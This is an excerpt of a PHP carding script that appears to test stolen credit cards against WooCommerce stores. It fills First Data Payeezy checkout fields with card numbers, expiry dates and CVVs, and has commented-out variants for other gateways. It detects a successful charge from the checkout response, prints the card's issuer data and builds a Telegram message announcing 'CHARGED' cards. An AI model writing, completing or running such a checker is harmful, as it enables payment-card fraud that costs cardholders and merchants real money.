...
$paymentMethods = [
    ...
    'first_data_payeezy_gateway_credit_card' => '/<input[^>]*name="payment_method"[^>]*value="first_data_payeezy_gateway_credit_card"/'
    ];
...
//     'anz_egate-card-number' => $cc,
//     'anz_egate-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
//  //  'wc-first-data-clover-credit-card-exp-year' => $mes_with_zero . ' / ' . $ano_no_20,
//     'anz_egate-card-cvc' =>  $cvv,
  //  'wc-bambora-credit-card-card-type=' => '',
    'wc-first-data-payeezy-gateway-credit-card-account-number' => $cc,
    'wc-first-data-payeezy-gateway-credit-card-expiry' => $mes . ' / ' . $ano,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED FIRSTDATA PAYEEZY]
    \n[$hostname1]
    \n[$receiptUrl]\n";
